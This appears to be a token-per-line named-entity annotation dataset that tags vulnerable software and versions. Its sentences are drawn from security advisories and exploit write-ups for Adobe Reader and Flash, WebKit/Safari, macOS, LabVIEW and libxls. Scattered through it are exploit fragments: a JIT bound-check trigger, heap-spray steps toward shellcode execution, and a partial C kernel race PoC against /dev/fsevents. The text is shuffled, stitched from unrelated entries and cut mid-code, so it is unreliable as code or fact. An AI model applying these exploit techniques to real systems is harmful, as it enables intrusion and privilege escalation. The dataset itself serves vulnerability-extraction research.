earlier S-vulnerable_version pair_0
, O O
15.006.30244 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
11.0.18 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
when O O
processing O O
Compact O O
Font O O
Format O O
data O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
15.020.20042 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30244 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
11.0.18 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
when O O
processing O O
JPEG O O
2000 O O
files O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
15.020.20042 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30244 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
11.0.18 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
when O O
processing O O
a O O
malformed O O
cross-reference O O
table O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
24.0.0.186 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
related O O
to O O
the O O
parsing O O
of O O
SWF O O
metadata O O
. O O

Adobe O O
Flash O O
- O O
Metadata O O
Parsing O O
Out-of-Bounds O O
Read O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
24.0.0.186 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
due O O
to O O
a O O
concurrency O O
error O O
when O O
manipulating O O
a O O
display O O
list O O
. O O

4 O O
) O O
POC O O
: O O

Flash O O
Player O O
was O O
created O O
by O O
Macromedia O O
and O O
has O O
been O O
developed O O
and O O
distributed O O
by O O
Adobe O O
Systems O O
since O O
Adobe O O
acquired O O
Macromedia O O
. O O

Flash O O
Player O O
can O O
run O O
from O O
a O O
web O O
browser O O
as O O
a O O
browser O O
plug-in O O
or O O
on O O
supported O O
mobile O O
devices O O
. O O

Source O O
: O O
Application O O
: O O
Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
Platforms O O
: O O
Windows O O
, O O
OSX O O
Versions O O
: O O
24.0.0.186 S-vulnerable_version pair_0
and O O
earlier O O
Author O O
: O O
Francis O O
Provencher O O
of O O
COSIG O O
Website O O
: O O
Twitter O O
: O O
@ O O
COSIG_ O O
Date O O
: O O
January O O
10 O O
, O O
2017 O O
CVE-2017-2930 O O
COSIG-2016-35 O O
1 O O
) O O
Introduction O O
2 O O
) O O
Report O O
Timeline O O
3 O O
) O O
Technical O O
details O O
4 O O
) O O
POC O O
1 O O
) O O
Introduction O O
Adobe O O
Flash O O
Player O O
( O O
labeled O O
Shockwave O O
Flash O O
in O O
Internet O O
Explorer O O
and O O
Firefox O O
) O O
is O O
a O O
freeware O O
software O O
for O O
using O O
content O O
created O O
on O O
the O O
Adobe O O
Flash O O
platform O O
, O O
including O O
viewing O O
multimedia O O
, O O
executing O O
rich O O
Internet O O
applications O O
, O O
and O O
streaming O O
video O O
and O O
audio O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
24.0.0.186 S-vulnerable_version pair_0
- O O
ActionGetURL2 O O
Out-of-Bounds O O
Memory O O
Corruption O O
( O O
1 O O
) O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
24.0.0.186 S-vulnerable_version pair_0
- O O
ActionGetURL2 O O
Out-of-Bounds O O
Memory O O
Corruption O O
( O O
2 O O
) O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
24.0.0.186 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
related O O
to O O
setting O O
visual O O
mode O O
effects O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
24.0.0.186 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
related O O
to O O
processing O O
of O O
atoms O O
in O O
MP4 O O
files O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
24.0.0.186 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
JPEG O O
XR O O
codec O O
. O O

An O O
attacker O O
needs O O
to O O
send O O
a O O
specially O O
crafted O O
websocket O O
packet O O
over O O
the O O
network O O
to O O
trigger O O
this O O
vulnerability O O
. O O

An O O
exploitable O O
memory O O
corruption O O
vulnerability O O
exists O O
in O O
the O O
Websocket O O
protocol O O
implementation O O
of O O
Cesanta S-vulnerable_software pair_0
Mongoose S-vulnerable_software pair_0
6.8 S-vulnerable_version pair_0
. O O

A O O
specially O O
crafted O O
websocket O O
packet O O
can O O
cause O O
a O O
buffer O O
to O O
be O O
allocated O O
while O O
leaving O O
stale O O
pointers O O
which O O
leads O O
to O O
a O O
use-after-free O O
vulnerability O O
which O O
can O O
be O O
exploited O O
to O O
achieve O O
remote O O
code O O
execution O O
. O O

A O O
specially O O
crafted O O
websocket O O
packet O O
can O O
cause O O
an O O
integer O O
overflow O O
, O O
leading O O
to O O
a O O
heap O O
buffer O O
overflow O O
and O O
resulting O O
in O O
denial O O
of O O
service O O
and O O
potential O O
remote O O
code O O
execution O O
. O O

An O O
attacker O O
needs O O
to O O
send O O
a O O
specially O O
crafted O O
websocket O O
packet O O
over O O
network O O
to O O
trigger O O
this O O
vulnerability O O
. O O

An O O
memory O O
corruption O O
vulnerability O O
exists O O
in O O
the O O
.SVG O O
parsing O O
functionality O O
of O O
Computerinsel S-vulnerable_software pair_0
Photoline S-vulnerable_software pair_0
20.02 S-vulnerable_version pair_0
. O O

A O O
specially O O
crafted O O
.SVG O O
file O O
can O O
cause O O
a O O
vulnerability O O
resulting O O
in O O
memory O O
corruption O O
, O O
which O O
can O O
potentially O O
lead O O
to O O
arbitrary O O
code O O
execution O O
. O O

An O O
attacker O O
can O O
send O O
a O O
specific O O
.SVG O O
file O O
to O O
trigger O O
this O O
vulnerability O O
. O O

A O O
specially O O
crafted O O
XLS O O
file O O
can O O
cause O O
a O O
memory O O
corruption O O
resulting O O
in O O
remote O O
code O O
execution O O
. O O

An O O
attacker O O
can O O
send O O
malicious O O
XLS O O
file O O
to O O
trigger O O
this O O
vulnerability O O
. O O

An O O
exploitable O O
out-of-bounds O O
write O O
vulnerability O O
exists O O
in O O
read_MSAT O O
function O O
of O O
libxls S-vulnerable_software pair_0
1.4 S-vulnerable_version pair_0
. O O

An O O
exploitable O O
out-of-bounds O O
write O O
vulnerability O O
exists O O
in O O
xls_mergedCells O O
function O O
of O O
libxls S-vulnerable_software pair_0
1.4 S-vulnerable_version pair_0
. O O
. O O

A O O
memory O O
corruption O O
vulnerability O O
exists O O
in O O
.PSD O O
parsing O O
functionality O O
of O O
ACDSee S-vulnerable_software pair_0
Ultimate S-vulnerable_version pair_0
10.0.0.292 S-vulnerable_version pair_0
. O O

A O O
specially O O
crafted O O
.PSD O O
file O O
can O O
cause O O
an O O
out O O
of O O
bounds O O
write O O
vulnerability O O
resulting O O
in O O
potential O O
code O O
execution O O
. O O

An O O
attacker O O
can O O
send O O
a O O
specific O O
.PSD O O
file O O
to O O
trigger O O
this O O
vulnerability O O
. O O

An O O
memory O O
corruption O O
vulnerability O O
exists O O
in O O
.GIF O O
parsing O O
functionality O O
of O O
Computerinsel S-vulnerable_software pair_0
Photoline S-vulnerable_software pair_0
20.02 S-vulnerable_version pair_0
. O O

A O O
specially O O
crafted O O
.GIF O O
file O O
can O O
cause O O
a O O
vulnerability O O
resulting O O
in O O
potential O O
code O O
execution O O
. O O

An O O
attacker O O
can O O
send O O
specific O O
.GIF O O
file O O
to O O
trigger O O
this O O
vulnerability O O
. O O

An O O
attacker O O
controlled O O
VI O O
file O O
can O O
be O O
used O O
to O O
trigger O O
this O O
vulnerability O O
and O O
can O O
potentially O O
result O O
in O O
code O O
execution O O
. O O

An O O
exploitable O O
memory O O
corruption O O
vulnerability O O
exists O O
in O O
RSRC O O
segment O O
parsing O O
functionality O O
of O O
LabVIEW S-vulnerable_software pair_0
2017 S-vulnerable_version pair_0
, O O
LabVIEW S-vulnerable_software pair_1
2016 S-vulnerable_version pair_1
, O O
LabVIEW S-vulnerable_software pair_2
2015 S-vulnerable_version pair_2
, O O
and O O
LabVIEW S-vulnerable_software pair_3
2014 S-vulnerable_version pair_3
. O O

A O O
specially O O
crafted O O
Virtual O O
Instrument O O
( O O
VI O O
) O O
file O O
can O O
cause O O
an O O
attacker O O
controlled O O
looping O O
condition O O
resulting O O
in O O
an O O
arbitrary O O
null O O
write O O
. O O

An O O
attacker O O
controlled O O
VI O O
file O O
can O O
be O O
used O O
to O O
trigger O O
this O O
vulnerability O O
, O O
exploitation O O
could O O
lead O O
to O O
remote O O
code O O
execution O O
. O O

A O O
specially O O
crafted O O
VI O O
file O O
can O O
cause O O
a O O
user O O
controlled O O
value O O
to O O
be O O
used O O
as O O
a O O
loop O O
terminator O O
resulting O O
in O O
internal O O
heap O O
corruption O O
. O O

An O O
exploitable O O
memory O O
corruption O O
vulnerability O O
exists O O
in O O
the O O
LvVariantUnflatten O O
functionality O O
in O O
64-bit O O
versions O O
of O O
LabVIEW S-vulnerable_software pair_0
before S-vulnerable_version pair_0
2015 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
f7 S-vulnerable_version pair_0
Patch S-vulnerable_version pair_0
and S-vulnerable_version pair_0
2016 S-vulnerable_version pair_0
before S-vulnerable_version pair_0
f2 S-vulnerable_version pair_0
Patch S-vulnerable_version pair_0
. O O

The O O
issue O O
involves O O
the O O
WindowServer O O
component O O
. O O

void O O
handleBlock O O
( O O
BlockIndex O O
blockIndex O O
if O O
( O O
range.m_count O O
) O O
{ O O
if O O
( O O
data.m_addend O O
range.m_maxBound O O
) O O
{ O O
range.m_maxBound O O
= O O
data.m_addend O O
; O O
range.m_maxOrigin O O
= O O
node- O O
> O O
origin.semantic O O
; O O
} O O
else O O
if O O
( O O
data.m_addend O O
< O O
range.m_minBound O O
) O O
{ O O
range.m_minBound O O
= O O
data.m_addend O O
; O O
range.m_minOrigin O O
= O O
node- O O
> O O
origin.semantic O O
The O O
problem O O
is O O
that O O
the O O
check O O
|data.m_addend O O
range.m_maxBound| O O
is O O
a O O
signed O O
comparison O O
. O O

For O O
example O O
, O O
when O O
the O O
following O O
JavaScript O O
code O O
is O O
compiled O O
, O O
there O O
are O O
all O O
bound O O
checks O O
for O O
8 O O
, O O
5 O O
, O O
2 O O
, O O
but O O
after O O
the O O
optimization O O
, O O
the O O
checks O O
for O O
5 O O
and O O
2 O O
are O O
removed O O
, O O
and O O
the O O
only O O
check O O
for O O
8 O O
will O O
remain O O
. O O

These O O
bound O O
checks O O
are O O
re-optimized O O
and O O
the O O
unnecessary O O
checks O O
are O O
removed O O
, O O
which O O
is O O
performed O O
by O O
IntegerCheckCombiningPhase O O
: O O
:handleBlock O O
. O O

function O O
f O O
( O O
) O O
{ O O
let O O
arr O O
= O O
new O O
Uint32Array O O
( O O
10 O O
) O O
; O O
for O O
( O O
let O O
i O O
= O O
0 O O
; O O
i O O
< O O
0x100000 O O
; O O
i++ O O
) O O
{ O O
parseInt O O
( O O
) O O
; O O
} O O
arr O O
= O O
1 O O
; O O
arr O O
= O O
2 O O
; O O
arr O O
= O O
3 O O
; O O
} O O
f O O
( O O
) O O
; O O
Note O O
: O O
parseInt O O
is O O
for O O
forcing O O
to O O
start O O
the O O
JIT O O
optimization O O
. O O

WebKit O O
JSC O O
- O O
JIT O O
Optimization O O
Check O O
Failed O O
in O O
IntegerCheckCombiningPhase O O
: O O
:handleBlock O O

The O O
issue O O
involves O O
the O O
IOGraphics O O
component O O
. O O

The O O
issue O O
involves O O
the O O
Multi-Touch O O
component O O
. O O

In O O
our O O
exploit O O
we O O
perform O O
step O O
5 O O
in O O
a O O
separate O O
web O O
worker O O
, O O
so O O
that O O
we O O
can O O
launch O O
a O O
second O O
stage O O
shellcode O O
immediately O O
after O O
the O O
victim O O
arrays O O
are O O
overwritten O O
. O O

We O O
use O O
the O O
following O O
heap O O
spray O O
to O O
exploit O O
the O O
bug O O
: O O
- O O
Allocate O O
100 O O
JSArrays O O
of O O
size O O
0x40000 O O
and O O
root O O
them O O
( O O
i.e O O
. O O

keep O O
references O O
) O O
. O O

This O O
will O O
trigger O O
GC O O
multiple O O
times O O
and O O
fill O O
up O O
holes O O
in O O
the O O
heap O O
. O O

What O O
is O O
left O O
to O O
do O O
now O O
is O O
to O O
perform O O
some O O
heap O O
feng-shui O O
to O O
place O O
something O O
interesting O O
on O O
the O O
heap O O
that O O
we O O
will O O
then O O
overflow O O
into O O
. O O

- O O
Allocate O O
4 O O
GiB O O
of O O
padding O O
using O O
JSArrays O O
. O O

The O O
target O O
buffer O O
will O O
be O O
allocated O O
in O O
the O O
sprayed O O
region O O
from O O
step O O
2 O O
and O O
the O O
victim O O
buffers O O
from O O
step O O
3 O O
will O O
be O O
overwritten O O
. O O

As O O
such O O
, O O
roughly O O
4 O O
billion O O
JSValues O O
will O O
have O O
to O O
be O O
allocated O O
, O O
taking O O
up O O
32 O O
GiB O O
in O O
RAM O O
. O O

- O O
Allocate O O
a O O
larger O O
JSArray O O
and O O
an O O
ArrayBuffer O O
of O O
the O O
same O O
size O O
. O O

It O O
will O O
, O O
however O O
, O O
take O O
roughly O O
a O O
minute O O
to O O
trigger O O
the O O
bug O O
. O O

This O O
triggers O O
GC O O
and O O
leaves O O
holes O O
of O O
size O O
0x40000 O O
in O O
the O O
heap O O
. O O

- O O
Trigger O O
the O O
bug O O
by O O
concatenating O O
JSArrays O O
with O O
a O O
combined O O
size O O
of O O
232 O O
+ O O
0x40000 O O
( O O
containing O O
the O O
repeated O O
byte O O
0x41 O O
) O O
. O O

This O O
increases O O
the O O
size O O
of O O
the O O
victim O O
array O O
to O O
the O O
sprayed O O
value O O
( O O
0x4141414141414141 O O
) O O
, O O
so O O
that O O
it O O
overlaps O O
with O O
the O O
victim O O
ArrayBuffer O O
. O O

These O O
end O O
up O O
directly O O
after O O
the O O
spray O O
from O O
step O O
2 O O
. O O

- O O
Allocate O O
100 O O
JSArrays O O
of O O
size O O
0x40000 O O
, O O
where O O
only O O
every O O
second O O
one O O
is O O
rooted O O
. O O

This O O
way O O
we O O
do O O
not O O
need O O
to O O
wait O O
for O O
the O O
full O O
overwrite O O
to O O
finish O O
, O O
and O O
the O O
heap O O
is O O
only O O
left O O
in O O
a O O
broken O O
state O O
for O O
a O O
very O O
short O O
time O O
, O O
so O O
that O O
garbage O O
collection O O
does O O
not O O
crash O O
( O O
which O O
runs O O
concurrently O O
starting O O
from O O
Safari S-vulnerable_software pair_0
version O O
10.1 S-vulnerable_version pair_0
) O O
. O O

The O O
final O O
steps O O
immediately O O
yield O O
the O O
fakeobj O O
and O O
addrof O O
primitives O O
described O O
in O O
section O O
1.2 O O
of O O
the O O
JavaScriptCore O O
phrack O O
paper O O
which O O
can O O
then O O
be O O
used O O
to O O
write O O
code O O
to O O
a O O
JIT O O
page O O
and O O
jump O O
to O O
it O O
. O O

Apple S-vulnerable_software pair_0
Safari S-vulnerable_software pair_0
10.1 S-vulnerable_version pair_0
- O O
Spread O O
Operator O O
Integer O O
Overflow O O
Remote O O
Code O O
Execution O O

And O O
that O O
place O O
is O O
secured O O
in O O
the O O
following O O
method O O
. O O

So O O
, O O
in O O
a O O
certain O O
case O O
, O O
it O O
fails O O
to O O
secure O O
the O O
place O O
for O O
|derivedConstructorPrivateName| O O
, O O
but O O
|emitPutToScope| O O
is O O
called O O
, O O
which O O
results O O
in O O
an O O
OOB O O
write O O
. O O

BytecodeGenerator O O
: O O
:initializeArrowFunctionContextScopeIfNeeded O O
: O O
if O O
( O O
isConstructor O O
( O O
) O O
& O O
& O O
constructorKind O O
( O O
) O O
ConstructorKind O O
: O O
:Extends O O
& O O
& O O
isSuperUsedInInnerArrowFunction O O
( O O
) O O
) O O
BytecodeGenerator O O
: O O
:emitPutDerivedConstructorToArrowFunctionContextScope O O
: O O
if O O
( O O
( O O
isConstructor O O
( O O
) O O
& O O
& O O
constructorKind O O
( O O
) O O
ConstructorKind O O
: O O
:Extends O O
) O O
|| O O
m_codeBlock- O O
> O O
isClassContext O O
( O O
) O O
) O O
{ O O
if O O
( O O
isSuperUsedInInnerArrowFunction O O
( O O
) O O
) O O
{ O O
Note O O
m_codeBlock- O O
> O O
isClassContext O O
( O O
) O O
. O O

void O O
BytecodeGenerator O O
: O O
:emitPutDerivedConstructorToArrowFunctionContextScope O O
( O O
) O O
{ O O
if O O
( O O
( O O
isConstructor O O
( O O
) O O
& O O
& O O
constructorKind O O
( O O
) O O
ConstructorKind O O
: O O
:Extends O O
) O O
|| O O
m_codeBlock- O O
> O O
isClassContext O O
( O O
) O O
) O O
{ O O
if O O
( O O
isSuperUsedInInnerArrowFunction O O
( O O
) O O
) O O
{ O O
ASSERT O O
( O O
m_arrowFunctionContextLexicalEnvironmentRegister O O
) O O
; O O
Variable O O
protoScope O O
= O O
variable O O
( O O
propertyNames O O
( O O
) O O
.builtinNames O O
( O O
) O O
.derivedConstructorPrivateName O O
( O O
) O O
) O O
; O O
emitPutToScope O O
( O O
m_arrowFunctionContextLexicalEnvironmentRegister O O
, O O
protoScope O O
, O O
& O O
m_calleeRegister O O
, O O
DoNotThrowIfNotFound O O
, O O
InitializationMode O O
: O O
:Initialization O O
emitPutToScope| O O
is O O
directly O O
called O O
without O O
resolving O O
the O O
scope O O
. O O

This O O
means O O
the O O
scope O O
|m_arrowFunctionContextLexicalEnvironmentRegister| O O
must O O
have O O
a O O
place O O
for O O
|derivedConstructorPrivateName| O O
. O O

WebKit O O
JSC O O
- O O
Incorrect O O
Check O O
in O O
emitPutDerivedConstructorToArrowFunctionContextScope O O

iCloud S-vulnerable_software pair_0
before S-vulnerable_version pair_0
6.2.1 S-vulnerable_version pair_0
on O O
Windows O O
is O O
affected O O
. O O

The O O
issue O O
involves O O
the O O
TextInput O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
via O O
crafted O O
data O O
. O O

The O O
TextInput O O
framework O O
which O O
is O O
loaded O O
has O O
a O O
class O O
TIKeyboardLayout O O
. O O

The O O
initWithCoder O O
: O O
implementation O O
has O O
this O O
code O O
: O O
( O O
this O O
is O O
the O O
x86 O O
code O O
, O O
the O O
framework O O
is O O
there O O
on O O
both O O
platforms O O
. O O
) O O

Use O O
ASAN O O
to O O
see O O
the O O
crash O O
clearly O O
( O O
see O O
provided O O
compiler O O
invokation O O
. O O
) O O

The O O
memcpy O O
then O O
uses O O
the O O
original O O
length O O
( O O
not O O
rounded O O
down O O
) O O
causing O O
a O O
controlled O O
heap O O
buffer O O
overflow O O
. O O

This O O
has O O
the O O
effect O O
of O O
mallocing O O
the O O
original O O
size O O
rounded O O
down O O
to O O
the O O
nearest O O
multiple O O
of O O
8 O O
. O O

tested O O
on O O
MacOS S-vulnerable_software pair_0
10.12.3 S-vulnerable_version pair_0
( O O
16D32 S-vulnerable_version pair_0
) O O
Proof O O
of O O
Concept O O
: O O

Attached O O
python O O
script O O
will O O
generate O O
a O O
serialized O O
NSBuiltinCharacterSet O O
with O O
a O O
value O O
of O O
42 O O
for O O
the O O
character O O
set O O
identifier O O
. O O

It O O
reads O O
a O O
controlled O O
int O O
using O O
decodeValueOfObjCType O O
: O O
i O O
then O O
either O O
passes O O
it O O
to O O
CFCharacterSetGetPredefined O O
or O O
uses O O
it O O
directly O O
to O O
manipulate O O
NSBuiltinSetTable O O
. O O

Neither O O
path O O
has O O
any O O
bounds O O
checking O O
and O O
the O O
index O O
is O O
used O O
to O O
maniupulate O O
c O O
arrays O O
of O O
pointers O O
. O O

Apple O O
macOS/iOS O O
- O O
NSUnarchiver O O
Heap O O
Corruption O O
Due O O
to O O
Lack O O
of O O
Bounds O O
Checking O O
in O O
[ O O
NSBuiltinCharacterSet O O
initWithCoder O O
: O O
] O O

The O O
issue O O
involves O O
the O O
CoreFoundation O O
component O O
. O O

( O O
note O O
that O O
the O O
actual O O
PoC O O
object O O
is O O
in O O
the O O
other O O
file O O
( O O
longer_patched.bin O O
) O O
tested O O
on O O
MacOS S-vulnerable_software pair_0
10.12.3 S-vulnerable_version pair_0
( O O
16D32 S-vulnerable_version pair_0
) O O
A O O
few O O
notes O O
on O O
the O O
relevance O O
of O O
these O O
bugs O O
: O O
NSXPC O O
uses O O
the O O
secure O O
version O O
of O O
NSKeyedArchiver O O
where O O
the O O
expected O O
types O O
have O O
to O O
be O O
declared O O
upfront O O
by O O
a O O
message O O
receiver O O
. O O

For O O
example O O
the O O
following O O
files O O
are O O
inside O O
the O O
AFC O O
jail O O
: O O
egrep O O
-Rn O O
NSKeyedArchiver O O
Binary O O
file O O
Downloads/downloads.28.sqlitedb O O
matches O O
Binary O O
file O O
Downloads/downloads.28.sqlitedb-wal O O
matches O O
Binary O O
file O O
PhotoData/AlbumsMetadata/0F31509F-271A-45BA-9E1F-C6F7BC4A537F.foldermetadata O O
matches O O
Binary O O
file O O
PhotoData/FacesMetadata/NVP_HIDDENFACES.hiddenfacemetadata O O
matches O O
00006890 O O
| O O
24 O O
76 O O
65 O O
72 O O
73 O O
69 O O
6F O O
6E O O
58 O O
24 O O
6F O O
62 O O
6A O O
65 O O
63 O O
74 O O
| O O
$ O O
versionX O O
$ O O
object O O
000068A0 O O
| O O
73 O O
59 O O
24 O O
61 O O
72 O O
63 O O
68 O O
69 O O
76 O O
65 O O
72 O O
54 O O
24 O O
74 O O
6F O O
70 O O
| O O
sY O O
$ O O
archiverT O O
$ O O
top O O
Proof O O
of O O
Concept O O
: O O

In O O
those O O
cases O O
you O O
could O O
use O O
these O O
bugs O O
to O O
escape O O
sandboxes/escalate O O
privileges O O
. O O

The O O
wikileaks O O
dump O O
implies O O
that O O
this O O
kind O O
of O O
bug O O
can O O
be O O
exploited O O
both O O
via O O
IPC O O
and O O
as O O
a O O
persistence O O
mechanism O O
where O O
apps O O
serialize O O
objects O O
to O O
disk O O
. O O

This O O
restricts O O
the O O
NSXPC O O
attack O O
surface O O
for O O
these O O
issues O O
to O O
either O O
places O O
where O O
overly O O
broad O O
base O O
classes O O
are O O
accepted O O
( O O
like O O
NSObject O O
) O O
or O O
to O O
just O O
those O O
services O O
which O O
accept O O
classes O O
with O O
vulnerable O O
deserializers O O
. O O

This O O
PoC O O
is O O
just O O
a O O
crasher O O
but O O
it O O
looks O O
pretty O O
exploitable O O
. O O

The O O
host O O
computer O O
would O O
need O O
to O O
have O O
a O O
valid O O
pairing O O
record O O
to O O
do O O
this O O
without O O
prompts O O
. O O

Some O O
regular O O
( O O
not O O
NSXPC O O
) O O
xpc O O
services O O
use O O
these O O
. O O

Apple O O
macOS/iOS O O
- O O
Memory O O
Corruption O O
Due O O
to O O
Bad O O
Bounds O O
Checking O O
in O O
NSCharacterSet O O
Coding O O
for O O
NSKeyedUnarchiver O O

Tested O O
on O O
Linux O O
. O O

bool O O
WARN_UNUSED_RETURN O O
ensureLength O O
( O O
VM O O
& O O
vm O O
, O O
unsigned O O
length O O
) O O
{ O O
ASSERT O O
( O O
length O O
< O O
MAX_ARRAY_INDEX O O
) O O
; O O
ASSERT O O
( O O
hasContiguous O O
( O O
indexingType O O
hasInt32 O O
( O O
indexingType O O
hasDouble O O
( O O
indexingType O O
hasUndecided O O
( O O
indexingType O O
( O O
) O O
) O O
) O O
; O O
bool O O
result O O
= O O
true O O
; O O
if O O
( O O
m_butterfly.get O O
( O O
) O O
- O O
> O O
vectorLength O O
( O O
) O O
< O O
length O O
) O O
result O O
= O O
ensureLengthSlow O O
( O O
vm O O
, O O
length O O
) O O
; O O
if O O
( O O
m_butterfly.get O O
( O O
) O O
- O O
> O O
publicLength O O
( O O
) O O
< O O
length O O
) O O
m_butterfly.get O O
( O O
) O O
- O O
> O O
setPublicLength O O
( O O
length O O
) O O
; O O
return O O
result O O
; O O
} O O
|setPublicLength| O O
is O O
called O O
whether O O
|ensureLengthSlow| O O
failed O O
or O O
not O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
via O O
a O O
crafted O O
SQL O O
statement O O
. O O

Tested O O
on O O
Safari S-vulnerable_software pair_0
10.0.3 S-vulnerable_version pair_0
( O O
12602.4.8 S-vulnerable_version pair_0
) O O
. O O

Apple S-vulnerable_software pair_0
WebKit S-vulnerable_software pair_0
Safari S-vulnerable_software pair_0
10.0.3 S-vulnerable_version pair_0
( O O
12602.4.8 S-vulnerable_version pair_0
) O O
- O O
WebCore O O
: O O
:FrameView O O
: O O
:scheduleRelayout O O
Use-After-Free O O

It O O
allows O O
attackers O O
to O O
execute O O
arbitrary O O
unsigned O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
a O O
crafted O O
app O O
. O O

watchOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
3.2 S-vulnerable_version pair_0
is O O
affected O O
. O O

tvOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.2 S-vulnerable_version pair_0
is O O
affected O O
. O O

iOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.3 S-vulnerable_version pair_0
is O O
affected O O
. O O

macOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.12.4 S-vulnerable_version pair_0
is O O
affected O O
. O O

This O O
leads O O
to O O
a O O
double O O
free O O
, O O
which O O
if O O
you O O
also O O
race O O
allocations O O
from O O
the O O
same O O
zone O O
can O O
lead O O
to O O
an O O
exploitable O O
kernel O O
use O O
after O O
free O O
. O O

/dev/fsevents O O
is O O
: O O
crw-r O O
r O O
1 O O
root O O
wheel O O
13 O O
, O O
0 O O
Feb O O
15 O O
14:00 O O
/dev/fsevents O O
so O O
this O O
is O O
a O O
privesc O O
from O O
either O O
root O O
or O O
members O O
of O O
the O O
wheel O O
group O O
to O O
kernel O O
tested O O
on O O
MacOS S-vulnerable_software pair_0
10.12.3 S-vulnerable_version pair_0
( O O
16D32 S-vulnerable_version pair_0
) O O
on O O
MacbookAir5,2 O O
( O O
build O O
with O O
-O3 O O
) O O
endif O O
include O O
< O O
fcntl.h O O
include O O
< O O
stdlib.h O O
include O O
< O O
stdio.h O O
include O O
< O O
sys/ioctl.h O O
include O O
< O O
sys/types.h O O
include O O
< O O
pthread.h O O
include O O
< O O
unistd.h O O
typedef O O
uint64_t O O
user64_addr_t O O
; O O
typedef O O
struct O O
fsevent_clone_args64 O O
{ O O
user64_addr_t O O
event_list O O
; O O
int32_t O O
num_events O O
; O O
int32_t O O
event_queue_depth O O
; O O
user64_addr_t O O
fd O O
; O O
} O O
fsevent_clone_args64 O O
; O O
define O O
FSEVENTS_CLONE_64 O O
_IOW O O
1 O O
, O O
fsevent_clone_args64 O O
) O O
pragma O O
pack O O
( O O
push O O
, O O
4 O O
) O O
typedef O O
struct O O
fsevent_dev_filter_args64 O O
{ O O
uint32_t O O
num_devices O O
; O O
user64_addr_t O O
devices O O
; O O
} O O
fsevent_dev_filter_args64 O O
; O O
pragma O O
pack O O
( O O
pop O O
) O O
define O O
FSEVENTS_DEVICE_FILTER_64 O O
_IOW O O
100 O O
, O O
fsevent_dev_filter_args64 O O
) O O
void O O
racer O O
( O O
void O O
thread_arg O O
) O O
{ O O
int O O
fd O O
= O O
( O O
int O O
) O O
thread_arg O O
; O O
printf O O
( O O
started O O
thread O O
) O O
; O O
fsevent_dev_filter_args64 O O
arg O O
= O O
{ O O
0 O O
} O O
; O O
int32_t O O
dev O O
= O O
0 O O
; O O
while O O
( O O
1 O O
) O O
{ O O
arg.num_devices O O
= O O
1 O O
; O O
arg.devices O O
= O O
( O O
user64_addr_t O O
) O O
& O O
dev O O
; O O
int O O
err O O
= O O
ioctl O O
( O O
fd O O
, O O
FSEVENTS_DEVICE_FILTER_64 O O
, O O
& O O
arg O O
) O O
; O O
if O O
( O O
err O O
-1 O O
) O O
{ O O

/dev/fsevents O O
is O O
: O O
crw-r O O
r O O
1 O O
root O O
wheel O O
13 O O
, O O
0 O O
Feb O O
15 O O
14:00 O O
/dev/fsevents O O
so O O
this O O
is O O
a O O
privesc O O
from O O
either O O
root O O
or O O
members O O
of O O
the O O
wheel O O
group O O
to O O
